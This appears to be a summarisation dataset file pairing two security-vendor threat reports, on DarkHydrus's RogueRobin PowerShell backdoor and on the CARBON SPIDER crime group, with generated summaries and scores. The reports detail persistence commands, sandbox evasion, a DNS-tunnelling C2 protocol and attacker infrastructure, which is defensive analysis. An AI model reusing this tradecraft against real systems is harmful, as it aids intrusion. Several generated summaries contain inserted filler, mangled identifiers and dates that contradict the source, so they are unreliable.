https://unit42.paloaltonetworks.com/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/;New Threat Actor Group DarkHydrus Targets Middle East Government;"This post is also available in: ??? (Japanese)In July 2018, Unit 42 analyzed a targeted attack using a novel file type against at least one government agency in the Middle East. It was carried out by a previously unpublished threat group we track as DarkHydrus. Based on our telemetry, we were able to uncover additional artifacts leading us to believe this adversary group has been in operation with their current playbook since early 2016. This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)..iqy files are simple text files containing a URL which are opened by default by Excel. Once opened, Excel will retrieve whatever object is at the URL inside the file. These files have most recently been found in use by criminals to deliver commodity RATs such as Flawed Ammyy. In DarkHydrus's case, the preferred payload retrieved in their previous attacks were exclusively open-source legitimate tools which they abuse for malicious purposes, such as Meterpreter and Cobalt Strike. However, in this instance, it appears that this group used a custom PowerShell based payload that we call RogueRobin.Attack AnalysisThe actors sent the spear-phishing emails between July 15 and 16. Each of the emails had a password protected RAR archive attached named credential.rar. The body of the message, seen in Figure 1 was written in Arabic and asks the recipient to review the document within the archive. The message also includes the password 123456 that is required to open the RAR archive. The credential.rar archive contained a malicious .iqy file named credential.iqy.Figure 1 Message body in delivery emailGoogle Translate renders the Arabic message as:HiPlease review and review the attached fileGratefullyPassword: 123456Payload AnalysisThe credential.iqy is an .iqy file (SHA256: cc1966eff7bed11c1faada0bb0ed0c8715404abd936cfa816cef61863a0c1dd6) that contains nothing more than the following text string:hxxp://micrrosoft[.]net/releasenotes.txtMicrosoft Excel natively opens .iqy files and will use the URL in the file to obtain remote data to include in the spreadsheets. By default, Excel does not allow the download of data from the remote server, but will ask for the user's consent by presenting the dialog box in Figure 2:Figure 2 Excel security notice for .iqy filesBy enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file. The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d) contains the following formula that Excel will save to the ""A0"" cell in the worksheet:The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1. By default, Excel will not launch the command prompt application, but will do so with the user's consent via the following dialog box in Figure 3:Figure 3 Confirmation of access of remote dataThe winupdate.ps1 script (SHA256: 36862f654c3356d2177b5d35a410c78ff9803d1d7d20da0b82e3d69d640e856e) is the main payload of this attack that we call RogueRobin. Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation. The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool.Before carrying out any of its functionality the payload checks to see if it is executing in a sandbox. The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment. The specific sandbox checks include:Using WMI to check BIOS version (SMBIOSBIOSVERSION) for VBOX, bochs, qemu, virtualbox and vm.Using WMI to check the BIOS manufacturer for XEN.Using WMI to check if the total physical memory is less than 2900000000.Using WMI to check if the number of CPU cores is less than or equal to 1.Enumerates running processes for ""Wireshark"" and ""Sysinternals"".If the payload determines it is not running in a sandbox, it will attempt to install itself to the system to persistently execute. To install the payload, the script will create a file %APPDATA%\OneDrive.bat and save the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File ""%APPDATA%\OneDrive.ps1""The script then writes a modified copy of itself to %APPDATA%\OneDrive.ps1, with the code that performs this installation omitted. To persistently execute when the system starts, the script will create the following shortcut in the Windows startup folder, which will run the OneDrive.ps1 script each time the user logs in:$env:SystemDrive\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnkThe payload itself communicates with its configured command and control (C2) servers using a custom DNS tunneling protocol. The domains configured within this payload are:Anyconnect[.]streamBigip[.]streamFortiweb[.]downloadKaspersky[.]sciencemicrotik[.]streamowa365[.]bidsymanteclive[.]downloadwindowsdefender[.]winThe DNS tunneling protocol can use multiple different DNS query types to interact with the C2 server. The payload has a function it calls early on that tests to see which DNS query types are able to successfully reach the C2 server. It iterates through a list of types and the first DNS type to receive a response from the C2 server will be used for all communications between the payload and the C2 server, which are in the following order (editor's note: AC is not a DNS record type but is a mode where the trojan will perform a request for an A record requiring ac as a subdomain):AAAAAAC - (see note above)CNAMEMXTXTSRVSOAThe payload uses the built-in Windows nslookup application with specific parameters and specially crafted subdomains to communicate with the C2. To establish communications with the C2, the payload will first get a system specific identifier issued by the C2 server. The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain:<current process id>.<c2 domain>The C2 server will provide the system specific identifier within the answer portion of the DNS response. Table 1 explains how the payload obtains the system identifier from the C2 server's answer depending on the query type:DNS Type Description A Uses the regular expression '(\d+)\-.$Global:domain' to get the decimal value from the answer AAAA The payload will split the IPv6 answer on "":"" take the [0] and [1] digits treat them as a hexadecimal value to obtain an integer. AC,CNAME,MX,TXT,SRV,SOA Uses the regular expression 'Address:\s+(\d+.\d+.\d+.\d+)' and uses the decimal value in the first octet of that IPv4 addressTable 1 Breakdown of query typesOnce the system identifier is obtained, the payload gathers system specific information and sends it to the C2 server. The information gathered is added to a string in the following structure:<IP address>|<computer name>|<domain>|<username>|<isAdmin flag>|<hasGarbage flag from config>|<hasStartup flag from config>|<""hybrid"" mode flag from config>|<sleep interval from config>|<jitter value from config>The payload will base64 encode this string and use its DNS tunneling protocol to transmit the data to the C2. The tunneling protocol transmits data by sending a series of DNS queries with the data within the subdomain of the C2 domain. The structure of each of these outbound DNS requests is as follows:<system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain>The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2. The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:DNS Type Successful Cancel A,AC 1.1.1.\d+ 1.2.9.\d+ AAAA 2a00:: 2200:: CNAME,MX,TXT,SRV,SOA ok cancelAfter providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs. The C2 will provide a string that the payload will use to determine the command to execute based on its command handler. To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure:<system id>-<job ID>-<offset data specific to job>.<c2 domain>The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server. The payload will use a specific regular expressions dependent on the type of DNS query was used to obtain the command string, which can be seen in Table 2:DNS TYPE Regex Pattern A Address:\s+(\d+.\d+.\d+.\d+) AC \d+-\d+-(\d+)-([\w\d+/=]+)-\d-.ac.$Global:domain AAAA Address:\s+(([a-fA-F0-9]{0,4}:{1,4}[\w|:]+){1,8}) CNAME,MX,TXT,SRV,SOA (\d+)-([\w\d/=+]{0,})\-.$Global:domainTable 2 Types of responses provided by C2These regular expressions are used to build strings that the payload will then subject to its command handler. We analyzed the payload to determine the commands available, which provide a variety of remote administration capabilities. The command handle looks for the following command strings in Table 3:Command Description $fileDownload Uploads the contents of a specified file to C2 $importModule Adds a specified PowerShell module to the current script $screenshot Executes the contents of the command, which should be the string '$screenshot'. We are not sure if this works, but the command name would suggest it is meant to take a screenshot $command Runs a PowerShell command and sends the output to the C2 slp:\d+ Sets the sleep interval between C2 beacons $testmode Issues DNS queries of A, AAAA, AC, CNAME, MX, TXT, SRV and SOA types to the C2 servers attempting to determine which DNS query types were successful. This command will automatically set the DNS type to use for actual C2 $showconfig Uploads the current configuration of the payload to the C2 slpx:\d+ Sets the sleep interval between outbound DNS requests $fileUpload Downloads contents from the C2 server and writes them to a specified fileTable 3 Commands available to payloadCampaign AnalysisThe following domains are configured within the payload to be used as C2s. Thematically, each domain appeared to be attempting to spoof the legitimate domain of an existing technology provider with an emphasis on security vendors.Anyconnect[.]streamBigip[.]streamFortiweb[.]downloadKaspersky[.]sciencemicrotik[.]streamowa365[.]bidsymanteclive[.]downloadwindowsdefender[.]winThe listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system. These IPs provided insufficient data for additional investigations. However, each of the listed domains used ns102.kaspersky[.]host and ns103.kaspersky[.]host as their name servers. Examination of ns102/ns103.kaspersky[.]host revealed that the second level domain kaspersky[.]host was illegitimate and not owned by the legitimate Kaspersky Labs. Passive DNS resolution of kaspersky[.]host revealed two IPs of interest, 107.175.150[.]113 and 94.130.88[.]9.94.130.88[.]9 showed passive DNS resolutions of two additional domains, 0utlook[.]bid and hotmai1[.]com. It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure. 107.175.150[.]113 showed one other domain resolution, <redacted>.0utl00k[.]net. We were able to link this specific domain as a C2 for another weaponized document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) containing a PowerShell script very similar to the one found in this attack. Examining the second level domain of 0utl00k[.]net revealed another IP of interest, 195.154.41[.]150. This IP contained two other domain resolutions following the vendor spoofing theme: allexa[.]net and cisc0[.]net. Expanding upon cisc0[.]net, we discovered several weaponized documents and payloads using this domain as a C2, from mid to late 2017.Open source intelligence provided by ClearSky Security indicates the domain cisc0[.]net is possibly related to the adversary group known as Copy Kittens. While there are significant tactical overlaps such as similarity of techniques used as well as victimology, we were unable to uncover significant evidence of relational overlaps. Further information regarding the Copy Kittens adversary can be found in a paper titled Operation Wilted Tulip.Our own dataset provides a solid grouping of the DarkHydrus group, with significant overlaps in C2 infrastructure as well as similarities in weaponized binaries. C2 domains were also left online and reused over an extended amount of time, such as the domain micrrosoft[.]net which was used in this attack in addition to two other payloads in January 2017 and July 2017.Studying the other samples, we have attributed to DarkHydrus, we are able to ascertain that this adversary has mainly leveraged weaponized Microsoft Office documents using tools available freely or from open source repositories such as Meterpreter, Mimikatz, PowerShellEmpire, Veil, and CobaltStrike. The documents generally do not contain malicious code and instead are weaponized to retrieve remote files containing malicious code on execution. Due to the modular nature of the delivery document, available data for analysis for these attacks are dependent upon the operational nature of the C2 server at the time of execution.ConclusionThe DarkHydrus group carried out an attack campaign on at least one government agency in the Middle East using malicious .iqy files. The .iqy files take advantage of Excel's willingness to download and include the contents from a remote server in a spreadsheet. DarkHydrus leveraged this obscure file format to run a command to ultimately install a PowerShell scripts to gain backdoor access to the system. The PowerShell backdoor delivered in this current attack may have been custom developed by the threat group, however, it is possible that DarkHydrus pieced together this tool by using code from legitimate open source tools.Palo Alto Networks customers are protected by:The micrrosoft[.]net domain has had a malicious classification since March 3, 2017.domain has had a malicious classification since March 3, 2017. All C2 domains associated with this payload have a command and control classification.Traps provides endpoint protection, as it can block Excel from creating a command prompt process.AutoFocus customers may learn more from the DarkHydrus tagIOCRelated SHA256 HashesPayloadscec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1ac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4a547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcdadd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffab2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3ce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd0099541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565cDelivery documentsd393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff6453188063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49cf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f90a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc10b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8ff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb001fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e26dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4cf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0e88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc67826e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245b5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350ad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771cRelated Domainsmaccaffe[.]comcisc0[.]net0utl00k[.]netmsdncss[.]com0ffice[.]com0ffiice[.]commicrrosoft[.]netanyconnect[.]streambigip[.]streamfortiweb[.]downloadkaspersky[.]sciencemicrotik[.]streamowa365[.]bidsymanteclive[.]downloadwindowsdefender[.]winallexa[.]netkaspersky[.]hosthotmai1[.]com0utlook[.]bid";This post is also available in: ??? (Japanese)In July 2018, Unit 42 analyzed a targeted attack using a novel file type against at least one government agency in the Middle East. It was carried out by a previously unpublished threat group we track as DarkHydrus. Based on our telemetry, we were able to uncover additional artifacts leading us to believe this adversary group has been in operation with their current playbook since early 2016. This attack diverged from previous attacks we observed from this group as it involved spearphishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy). Once opened, Excel will retrieve whatever object is at the URL inside the file. These files have most recently been found in use by criminals to deliver commodity RATs such as Flawed Ammyy. In DarkHydrus's case, the preferred payload retrieved in their previous attacks were exclusively opensource legitimate tools which they abuse for malicious purposes, such as Meterpreter and Cobalt Strike. However, in this instance, it appears that this group used a custom PowerShell based payload that we call RogueRobin.Attack AnalysisThe actors sent the spearphishing emails between July 15 and 16. Each of the emails had a password protected RAR archive attached named credential.rar. The body of the message, seen in Figure 1 was written in Arabic and asks the recipient to review the document within the archive. The message also includes the password 123456 that is required to open the RAR archive. The credential.rar archive contained a malicious .iqy file named credential.iqy.Figure 1 Message body in delivery emailGoogle The ITSecurity report has been summarized. The following domains are configured within the payload to be used as C2s. Thematically, each domain appeared to be attempting to spoof the legitimate domain of an existing technology provider with an emphasis on security vendors. Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]sciencemicrotik[.]stream owa365[.]bidsymanteclive[.]download windowsdefender[. ]win The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system. These IPs provided insufficient data for additional investigations. However, each of the listed domains used ns102.kaspersky[. ]host and ns103.kaspersky[. ]host as their name servers. Examination of ns102/ns103.kaspersky[. The ITSecurity report found that the second level domain kaspersky[. ]host was illegitimate and not owned by the legitimate Kaspersky Labs. Passive DNS resolution of kaspersky[. ]host revealed two IPs of interest, 107.175.150[. ]113 and 94.130.88[.]9.94.130.88[. ]9 showed passive DNS resolutions of two additional domains, 0utlook[. ]bid and hotmai1[.]com. It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure. 107.175.150[. ]113 showed one other domain resolution, <redacted>.0utl00k[.]net. We were able to link this specific domain as a C2 for another weaponized document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) containing a PowerShell script very similar to the one found in this attack. Examining the second level domain of 0utl00k[. ]net revealed another IP of interest, 195.154.41[.]150. This IP contained two other domain resolutions following the vendor spoofing theme: allexa[. ]net and cisc0[.]net.;en;{'r': 0.34225844004656575, 'p': 0.9576547231270358, 'f': 0.5042881607861244};{'r': 0.26091586794462196, 'p': 0.9423076923076923, 'f': 0.4086738915159353};{'r': 0.34225844004656575, 'p': 0.9576547231270358, 'f': 0.5042881607861244}
https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/;Arrests Put New Focus on CARBON SPIDER Adversary Group;"In an indictment unsealed by the U.S. Department of Justice (DoJ) on Aug. 1, 2018, three Ukrainian nationals have been charged with conspiracy, wire fraud, computer hacking, access device fraud and aggravated identity theft. Dmytro Fedorov, 44, Fedir Hladyr, 33, and Andrii Kopakov, 30, are suspected to be key members within CARBON SPIDER's point of sale (POS) subgroup.The arrests took place between January and June 2018, and coincided with a slowdown in CARBON SPIDER activity. The DoJ announcement also details the group's use of a front company, named Combi Security, to recruit developers and intrusion specialists for its operations. Given that other members of this subgroup remain at large, it is likely that the tactics, techniques and procedures (TTPs) may change but activity will continue.CARBON SPIDER, more widely known as the Carbanak group, is a long-standing criminal enterprise responsible for compromising banks to transfer funds to mule accounts, performing ATM jackpotting attacks, and conducting mass compromise of debit and credit cards from POS terminals in large enterprises. They have been active in some form since at least 2013. During that time, the group has focused on the banking, financial, media, technology, hospitality, and food and beverage verticals, using targeted campaigns to reach their objectives.Untangling the CARBON SPIDER WebThe structure of CARBON SPIDER is very complex and was initially suspected to be a single group, based on their use of several custom tools and specific TTPs. However, further research into the structure indicates that there are several clusters of activity likely made up of subgroups serving different missions, potentially with access to a shared development environment and pool of resources. A complex structure such as this is difficult to manage and speaks to the sophistication of the actor.This blog aims to examine CARBON SPIDER over time and attempts to describe their changing relationship within the eCrime ecosystem.Custom ToolsCARBON SPIDER has leveraged many custom tools since it began activity in 2013, including its primary implant Sekur (a.k.a. Anunak). These include the following:SekurName Sekur Aliases Anunak and Carbanak RAT First Seen February 2014 (based on compile time) Last Seen November 2017 (based on compile time) Purpose Primary remote access toolkit (RAT) for monitoring victim systems of interest Type Microsoft Windows executable Example Hash f70cef297efe9ec0abea369b3c1235f14220a6165b48f6e8aa054296078122c8 Falcon EPP protection Machine learning: Cloud-based, on-sensor indicators of attack(IOAs): Suspicious activity MITRE ATT&CK(tm) technique analysis from Hybrid AnalysisSekur has been CARBON SPIDER's primary tool for several years, although usage over the last year appears to have declined. It contains all the functionality you would expect from a RAT, allowing the adversary to execute commands, manage the file system, manage processes, and collect data. In addition, it can record videos of victim sessions, log keystrokes, enable remote desktop, or install Ammyy Admin or VNC modules. From July 2014 on, samples were compiled with the capability to target Epicor POS systems and to collect credit card data.Agent ORMName Agent ORM Aliases Toshliph and DRIFTPIN First Seen June 2015 (based on compile time) Last Seen May 2016 (based on compile time) Purpose First-stage information collection and downloading next-stage payloads Type Microsoft Windows executable Example Hash 36937e5e744873b3646c9d345e8cf50fb969029dc77525acfe63d5a9d28b73f2 Falcon EPP protection Machine learning: Cloud-based, on-sensor IOAs: Suspicious activity MITRE ATT&CK(tm) technique analysis from Hybrid AnalysisAgent ORM began circulating alongside Sekur in campaigns throughout the second half of 2015. The malware collects basic system information and is able to take screenshots of victim systems. It is used to download next-stage payloads when systems of interest are identified. It is strongly suspected that Agent ORM has been deprecated in favor of script-based first-stage implants (VB Flash, JS Flash, and Bateleur).VB FlashName VB Flash Aliases HALFBAKED First Seen September 2015 (based on observed distribution) Last Seen May 2017 (based on observed distribution) Purpose First-stage information collection and downloading next-stage payloads Type VBScript Example Hash a7a927bd44040817ae39e15aeb3f0b69ca943d4ce5b00d12eed6fae5b1c325d0 Falcon EPP protection IOAs: Attacker methodology, Suspicious activityVB Flash was first observed being deployed alongside Agent ORM in September 2015. It is likely that this was developed as a replacement to Agent ORM and contained similar capabilities. The first observed instance of VB Flash included comments and was easy to analyze--later versions soon began to integrate multiple layers of obfuscation. Several versions of VB Flash were developed including ones that utilized Google Forms, Google Macros, and Google Spreadsheets together to make a command-and-control (C2) channel. This variant would POST victim data to a specified Google form, then make a request to a Google macro script, receiving an address for a Google Spreadsheet from which to request commands.JS FlashName JS Flash Aliases JavaScript variant of HALFBAKED First Seen May 2017 (based on observed distribution) Last Seen November 2017 (based on observed distribution) Purpose First-stage information collection and downloading next-stage payloads Type JavaScript Example Hash ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685 Falcon EPP protection IOAs: Attacker methodology, Suspicious activityJS Flash capabilities closely resemble those of VB Flash and leverage interesting techniques in deployment via batch scripts embedded as OLE objects in malicious documents. Many iterations of JS Flash were observed being tested before deployment, containing minor changes to obfuscation and more complex additions, such as the ability to download TinyMet (a cutdown of the Metasploit Meterpreter payload). PowerShell was also used heavily for the execution of commands and arbitrary script execution. No JS Flash samples were observed being deployed after November 2017.BateleurName Bateleur Aliases N/A First Seen June 2017 (based on observed distribution) Last Seen April 2018 (based on observed distribution) Purpose First-stage information collection and downloading next-stage payloads Type JavaScript Example Hash da70df51aa80414fcba9bf7322e44e8ea5ed6a3725f342cd05c733376c6f2121 FalconEPP protection IOAs: Malicious document, Establishing persistence. MITRE ATT&CK(tm) technique analysis from Hybrid AnalysisBateleur deployments began not long after JS Flash and were also written in JavaScript. Deployments were more infrequent and testing was not observed. It is likely that Bateleur was run in parallel as an alternative tool and eventually replaced JS Flash as CARBON SPIDER's first stage tool of choice. Although much simpler in design than JS Flash, all executing out of a single script with more basic obfuscation, Bateleur has a wealth of capabilities--including the ability to download arbitrary scripts and executables, deploy TinyMet, execute commands via PowerShell, deploy a credential stealer, and collect victim system information such as screenshots.Clusters of ActivityBased on the use of these tools, it is possible to group the CARBON SPIDER activity into several clusters. These clusters may represent different groups with a common tool supply chain, or isolated campaigns from the same group, using separate individuals to carry out attacks with a different focus.Point of Sale (POS) TargetingTarget Region Primarily U.S. and Western Europe Target Sector Enterprises that process many card transactions (in particular casinos, hotels, and restaurant chains) Active From At least mid 2015 Active To CurrentThe POS cluster is the most prolific associated to the CARBON SPIDER actor and is also known as FIN7. This cluster has used all the custom tools described with VB Flash, JS Flash, and Bateleur that are unique to them. Over time, they have used targeted spear phishing emails to deploy malicious documents that initially used exploits, more recently, they have used macros and OLE embedded objects. The primary method of cash out for this group is the acquisition and sale of credit and debit card dumps from POS devices. Many of the stolen cards are sold as collectives on the eCrime marketplace, Joker's Stash.Targeting of Russian Financial InstitutionsTarget Region Russia Target Sector Financial and banking Active From Late 2013 Active To Early 2015This cluster can also be described as the original Carbanak group. It is suspected that they stole large sums of money using several cash out methods against Russian banks, at which point the group may have diverged. It is likely that they developed the primary CARBON SPIDER implant Sekur and were, at the point of being operational, probably the only users of it.Targeting of Middle Eastern Financial InstitutionsTarget Region Middle East and South Asia Target Sector Financial and banking Active From October 2014 Active To Activity reported up to at least early 2016Although the targeting profile is the same as the Russian banking cluster, the TTPs are very different. In particular, the use of tooling stands out from other clusters of CARBON SPIDER activity. As with other clusters, the primary infection vector is targeted spear phishing emails that use exploits for a variety of vulnerabilities in Microsoft Office:CVE-2015-2545CVE-2014-4114CVE-2015-1770CVE-2015-1641A custom .NET first stage payload is deployed that in some cases deploys Agent ORM or Sekur, but is also used to deploy NetWire. Instances of DarkComet and Morphine RAT use some custom .NET downloader servers as their C2. One possibility is that CARBON SPIDER outsourced deployment of their malware for this campaign. An alternative theory is that this is a seperate group also using CARBON SPIDER tools. Little is reported publicly about the successfulness of this cluster of activity, and no cash out methods are known.Targeting of Eastern European Financial InstitutionsTarget Region Ukraine and Eastern Europe Target Sector Likely financial and banking Active From Mid-2015 Active To Last known activity in late 2015The Eastern European banking cluster is based on a single campaign using a strategic web compromise of an Italian bank in Ukraine to deploy instances of Agent ORM to likely Ukrainian targets. It is likely that this cluster links to one of the other clusters of Sekur activity, possibly the unattributed activity discussed below. However, no follow-on actions have been observed past Agent ORM deployment.UnattributedTarget Region Where known (appears to be Ukraine) Target Sector Not known in most cases (one case focused on news and media organizations) Active From May 2015 Active To At least January 2017The unattributed activity is based on a cluster of Sekur activity that runs in parallel with the POS cluster of activity, but does not exhibit the same TTPs (with differences in Sekur configuration, campaigns, and infrastructure selection). Many of these samples were submitted from Ukraine, additionally, one of them was deployed using a malicious document with a decoy that suggests Ukrainian news and media targeting. It is possible that this activity relates to the Eastern European bank cluster of Agent ORM activity, yet without further evidence of follow-on activity, it is not possible to determine this cluster's action on objectives.TimelineBelow is a timeline showing the activity of each of the five clusters of CARBON SPIDER activity:The timeline shows that several of these clusters of activity started just after public reporting of the group (around mid-2015) and that the divergence in activity may have been the result of this exposure. It also highlights that CARBON SPIDER now likely operates multiple parallel missions focusing on different regions and sectors.Links to Other Targeted eCrime GroupsBeyond the described clusters of CARBON SPIDER activity based around their custom tools, their are also interesting links to other tracked, targeted eCrime activity. This includes the group dubbed RATPAK SPIDER (also known as Buhtrap) that targets Russian and Ukrainian financial institutions, a group dubbed Odinaff targeting SWIFT systems particularly in Eastern Europe, and the group COBALT SPIDER (also known as Cobalt) that, again, specializes in targeting Russian banks.RATPAK SPIDEROperation Buhtrap had a similar target scope (Russian financial) to the first cluster of CARBON SPIDER activity. Although these have always been tracked as seperate groups, there is a technical link between payload deployments. A custom macro dropper that would encode the payload using VB Script notation, and contained the strings ""After OnTime"" and ""FUCK AV,"" was observed in only 19 unique samples across Crowdstrike sample stores. One of the payloads was an instance of Agent ORM used to targeted casinos, a second payload also used by CARBON SPIDER was an instance of Sekur. The other six unique payloads observed being deployed using this custom macro dropper were instances of the Nullsoft Scriptable Install System (NSIS) downloader attributed to the Buhtrap group. Initially, this led to tracking both threats as CARBON SPIDER. Although it now appears that Buhtrap is likely a separate entity, the use of this shared deployment mechanism -- unique to these two groups -- suggests a common supply chain or developer and a closer working relationship, especially given some similarities in target scope.OdinaffA SWIFT compromise was observed in mid-2016, targeting a Ukrainian bank that at the time was unattributed. Based on similar TTPs, it was hypothesised that this could be CARBON SPIDER activity, however, although common off-the-shelf tools (such as Meterpreter and Cobalt Strike) were used, the custom CARBON SPIDER arsenal was not present. Later, this group was reported in open source as Odinaff. In addition to similar TTPs, there appeared to be some infrastructure overlap with two IP addresses. One Odinaff C2 was also reported to be in previous use as a Sekur plugin server. A second IP was also reported to be used by CARBON SPIDER in a previous campaign. Again, this may just be a shared hosting provider, but the TTP similarity makes this infrastructure overlap more noteworthy.COBALT SPIDERThe Cobalt group, tracked by CrowdStrike intelligence as COBALT SPIDER, bears many similarities in the targeting of banks to the Russian cluster of CARBON SPIDER activity. Both groups also use Cobalt Strike and several other pen-testing tools in their operations, nevertheless, the two groups appear to be distinct outside of this.On March 26, 2018, an announcement was made that a Russian citizen identified by authorities as ""Denis K."" was arrested by the Spanish national police in Alicante, Spain. He was reportedly involved in early CARBON SPIDER targeting of Russian banks and is suspected of being one of the members of COBALT SPIDER. Although reports suggest that he may have been a leader of COBALT SPIDER, activity has continued from this group, suggesting his role was not a key one within this organization. This suggests a link between the two groups between 2013 and likely, 2015. This is around the time that the dominant focus for CARBON SPIDER became targeting the POS systems of Western enterprises. It is possible that at least one individual left CARBON SPIDER and either joined forces with or created COBALT SPIDER.SummaryCARBON SPIDER is the pioneer of targeted eCrime activity with some of the largest publicly attributed success. Their level of sophistication across the clusters of activity makes them a key player in the eCrime ecosystem. Although there is not enough evidence to directly link CARBON SPIDER to other targeted criminal groups, it is assessed with high confidence (based on analysis of artifacts and infrastructure over time) that CARBON SPIDER shares resources with other notable criminal groups.There are two possible hypotheses as to how the clusters of CARBON SPIDER activity are linked. One theory is that they were originally one group that splintered into several with different focuses. Several of the splinter groups may have maintained access to their custom tools (e.g., Sekur), while others moved on to work with other actors (e.g., COBALT SPIDER). A second theory is that CARBON SPIDER operates as distinct groups with different focuses, but they report to a single management structure. Resources may be shared between the groups, but each has its own members. At this stage, the first theory appears to be the most likely.Based on recently observed tooling and operations, CARBON SPIDER appears to be focusing their efforts on the POS cluster of activity against the hospitality and restaurant sector, with no recently reported activity against banks. They also appear to be moving away from their custom tooling, with no Sekur samples compiled since November 2017 and fewer samples appearing in live operations.Going forward, it is likely that CARBON SPIDER will continue operations to target sectors that give the best financial return for their efforts. For the short term, this will likely mean a continued focus on POS systems and large enterprises that process them. It is possible that they may return to target banks, but this would likely be on a small scale with very focused operations. CARBON SPIDER will likely move completely away from their old custom toolset, either developing new tools or using commodity off-the-shelf packages to achieve their objectives. This is even more assured given the arrests of three members of the most prolific CARBON SPIDER subgroup.As CARBON SPIDER adversary groups retool and alter their TTPs CrowdStrike will continue to track this adversary leveraging CrowdStrike CrowdStrike Falcon(r) Intelligence capabilities to combine endpoint protection, automation and malware analysis to prevent CARBON SPIDER from breaching our customer networks.To learn more about how to incorporate intelligence on threat actors like CARBON SPIDER into your security strategy, please visit the Falcon Intelligence product page.Download the CrowdStrike 2020 Global Threat Report";CARBON SPIDER is a sophisticated cybercrime group that has been active since at least mid2015. The group specializes in targeting Russian and Ukrainian financial institutions, as well as Middle Eastern and South Asian financial and banking institutions. The group uses a variety of TTPs, including targeted spear phishing emails that use exploits for a variety of vulnerabilities in Microsoft Office:CVE20152545CVE20144114CVE20151770A custom .NET first stage payload is deployed that in some cases deploys Agent ORM or Sekur, but is also used to deploy NetWire. Instances of DarkComet and Morphine RAT use some custom .NET downloader servers as their C2. One possibility is that CARBON SPIDER outsourced deployment of their malware for this campaign. An alternative theory is that this is a seperate group also using CARBON SPIDER tools. Little is reported publicly about the successfulness of this cluster of activity, and no cash out methods are known.The Eastern European banking cluster is based on a single campaign using a strategic web compromise of an Italian bank in Ukraine to deploy instances of Agent ORM to likely Ukrainian targets. It is likely that this cluster links to one of the other clusters of activity, possibly the unattributed activity discussed below. However, no followon actions have been observed past Agent ORM deployment.The unattributed activity is based on a cluster of Sekur activity that runs in parallel with the POS cluster of activity, but does not exhibit the same TTPs (with differences in Sekur configuration, campaigns, and infrastructure selection CARBON 